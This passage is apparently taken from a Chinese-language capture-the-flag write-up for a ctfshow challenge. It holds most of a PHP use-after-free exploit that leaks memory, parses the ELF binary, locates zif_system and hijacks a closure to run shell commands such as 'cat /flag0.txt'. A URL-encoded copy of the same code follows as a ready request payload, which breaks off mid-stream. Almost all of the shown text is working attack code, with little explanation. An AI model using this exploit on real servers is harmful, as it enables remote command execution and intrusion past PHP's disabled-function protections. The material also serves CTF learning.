class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>于是payload就是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span>%20<span class="title">ctfshow</span>(<span class="params">%<span class="number">24</span>cmd</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">global</span>%20%24<span class="title">abc</span>%2<span class="title">C</span>%20%24<span class="title">helper</span>%2<span class="title">C</span>%20%24<span class="title">backtrace</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">class</span>%20<span class="title">Vuln</span>%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">public</span>%20%24<span class="title">a</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">public</span>%20<span class="title">function</span>%20<span class="title">__destruct</span>(<span class="params"></span>)%20%7<span class="title">B</span>%20%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">global</span>%20%24<span class="title">backtrace</span>%3<span class="title">B</span>%20%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">unset</span>(<span class="params">%<span class="number">24</span>this-%<span class="number">3</span>Ea</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">backtrace</span>%20%3<span class="title">D</span>%20(<span class="params"><span class="keyword">new</span>%<span class="number">20</span><span class="built_in">Exception</span></span>)-%3<span class="title">EgetTrace</span>(<span class="params"></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">!<span class="keyword">isset</span>(<span class="params">%<span class="number">24</span>backtrace%<span class="number">5</span>B1%<span class="number">5</span>D%<span class="number">5</span>B<span class="string">&#x27;args&#x27;</span>%<span class="number">5</span>D</span>)</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">backtrace</span>%20%3<span class="title">D</span>%20<span class="title">debug_backtrace</span>(<span class="params"></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">class</span>%20<span class="title">Helper</span>%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">public</span>%20%24<span class="title">a</span>%2<span class="title">C</span>%20%24<span class="title">b</span>%2<span class="title">C</span>%20%24<span class="title">c</span>%2<span class="title">C</span>%20%24<span class="title">d</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">str2ptr</span>(<span class="params">%<span class="number">26</span>%<span class="number">24</span>str%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>p%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>s%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">208</span></span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">address</span>%20%3<span class="title">D</span>%200%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>j%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>s-<span class="number">1</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>j%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>j--</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">address</span>%20%3<span class="title">C</span>%3<span class="title">C</span>%3<span class="title">D</span>%208%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">address</span>%20%7<span class="title">C</span>%3<span class="title">D</span>%20<span class="title">ord</span>(<span class="params">%<span class="number">24</span>str%<span class="number">5</span>B%<span class="number">24</span>p%<span class="number">2</span>B%<span class="number">24</span>j%<span class="number">5</span>D</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">return</span>%20%24<span class="title">address</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">ptr2str</span>(<span class="params">%<span class="number">24</span>ptr%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>m%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">208</span></span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">out</span>%20%3<span class="title">D</span>%20%22%22%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">for</span>%20(<span class="params">%<span class="number">24</span>i%<span class="number">3</span>D0%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>m%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">out</span>%20.%3<span class="title">D</span>%20<span class="title">sprintf</span>(<span class="params">%<span class="number">22</span>%<span class="number">25</span>c%<span class="number">22</span>%<span class="number">2</span>C(<span class="params">%<span class="number">24</span>ptr%<span class="number">20</span>%<span class="number">26</span>%<span class="number">200</span>xff</span>)</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">ptr</span>%20%3<span class="title">E</span>%3<span class="title">E</span>%3<span class="title">D</span>%208%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">return</span>%20%24<span class="title">out</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">write</span>(<span class="params">%<span class="number">26</span>%<span class="number">24</span>str%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>p%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>v%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>n%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">208</span></span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">i</span>%20%3<span class="title">D</span>%200%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>n%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">str</span>%5<span class="title">B</span>%24<span class="title">p</span>%20%2<span class="title">B</span>%20%24<span class="title">i</span>%5<span class="title">D</span>%20%3<span class="title">D</span>%20<span class="title">sprintf</span>(<span class="params">%<span class="number">22</span>%<span class="number">25</span>c%<span class="number">22</span>%<span class="number">2</span>C(<span class="params">%<span class="number">24</span>v%<span class="number">20</span>%<span class="number">26</span>%<span class="number">200</span>xff</span>)</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">v</span>%20%3<span class="title">E</span>%3<span class="title">E</span>%3<span class="title">D</span>%208%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>addr%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>p%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>s%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">208</span></span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">global</span>%20%24<span class="title">abc</span>%2<span class="title">C</span>%20%24<span class="title">helper</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x68%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>addr%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">20</span>%<span class="number">24</span>p%<span class="number">20</span>-%<span class="number">200</span>x10</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">leak</span>%20%3<span class="title">D</span>%20<span class="title">strlen</span>(<span class="params">%<span class="number">24</span>helper-%<span class="number">3</span>Ea</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>s%<span class="number">20</span>!%<span class="number">3</span>D%<span class="number">208</span></span>)%20%7<span class="title">B</span>%20%24<span class="title">leak</span>%20%25%3<span class="title">D</span>%202%20%3<span class="title">C</span>%3<span class="title">C</span>%20(<span class="params">%<span class="number">24</span>s%<span class="number">20</span>*%<span class="number">208</span></span>)%20-%201%3<span class="title">B</span>%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">return</span>%20%24<span class="title">leak</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">parse_elf</span>(<span class="params">%<span class="number">24</span>base</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">e_type</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>base%<span class="number">2</span>C%<span class="number">200</span>x10%<span class="number">2</span>C%<span class="number">202</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">e_phoff</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>base%<span class="number">2</span>C%<span class="number">200</span>x20</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">e_phentsize</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>base%<span class="number">2</span>C%<span class="number">200</span>x36%<span class="number">2</span>C%<span class="number">202</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">e_phnum</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>base%<span class="number">2</span>C%<span class="number">200</span>x38%<span class="number">2</span>C%<span class="number">202</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>e_phnum%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">header</span>%20%3<span class="title">D</span>%20%24<span class="title">base</span>%20%2<span class="title">B</span>%20%24<span class="title">e_phoff</span>%20%2<span class="title">B</span>%20%24<span class="title">i</span>%20*%20%24<span class="title">e_phentsize</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">p_type</span>%20%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>header%<span class="number">2</span>C%<span class="number">200</span>%<span class="number">2</span>C%<span class="number">204</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">p_flags</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>header%<span class="number">2</span>C%<span class="number">204</span>%<span class="number">2</span>C%<span class="number">204</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">p_vaddr</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>header%<span class="number">2</span>C%<span class="number">200</span>x10</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">p_memsz</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>header%<span class="number">2</span>C%<span class="number">200</span>x28</span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>p_type%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">201</span>%<span class="number">20</span>%<span class="number">26</span>%<span class="number">26</span>%<span class="number">20</span>%<span class="number">24</span>p_flags%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">206</span></span>)%20%7<span class="title">B</span>%20%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">data_addr</span>%20%3<span class="title">D</span>%20%24<span class="title">e_type</span>%20%3<span class="title">D</span>%3<span class="title">D</span>%202%20%3<span class="title">F</span>%20%24<span class="title">p_vaddr</span>%20%3<span class="title">A</span>%20%24<span class="title">base</span>%20%2<span class="title">B</span>%20%24<span 